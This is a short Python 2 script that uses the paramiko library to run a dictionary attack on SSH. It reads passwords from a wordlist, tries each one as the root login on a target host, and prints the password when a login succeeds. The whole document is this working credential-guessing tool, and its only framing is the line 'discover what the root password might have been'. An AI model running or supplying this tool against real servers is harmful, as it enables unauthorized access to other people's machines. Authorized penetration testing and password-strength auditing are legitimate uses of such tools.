#!/usr/bin/env python

import paramiko
import argparse
import os, sys, socket

def parse_args():
    parser = argparse.ArgumentParser(description="Attempt to discover what the root password might have been")
    parser.add_argument('host', metavar="hostname", type=str, nargs=1, help="host to connect to")
    parser.add_argument('--file', type=str, nargs=1, help="initial list of passwords to test")

    return parser.parse_args()

def ssh_connect(host,password,username='root',code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host,port=22,username=username,password=password)
    except paramiko.AuthenticationException:
        # Authentication Failure
        code = 1
    except socket.error,e:
        # Connection Failure
        code = 2

    ssh.close()
    return code

if __name__ == "__main__":
    try:
        args = parse_args()
        if args.file and os.path.exists(args.file[0]) == False:
            print "[E] File '%s' does not exist" %(args.file)
            sys.exit(4)
    except KeyboardInterrupt:
        print "[I] Interrupted by user intervention"
        sys.exit(3)

    input_file = open(args.file[0])

    for attempt in input_file.readlines():
        password = attempt.strip("\n")
        try:
            result = ssh_connect(args.host[0],password)
            if result == 0:
                print ""
                print " - Password found: [ %s ]" %(password)
                sys.exit(0)
            elif result == 1:
                print ".",
            elif result == 2:
                print " [E] Connection Refused, giving up"
        except Exception, e:
            print e
            pass
    input_file.close()
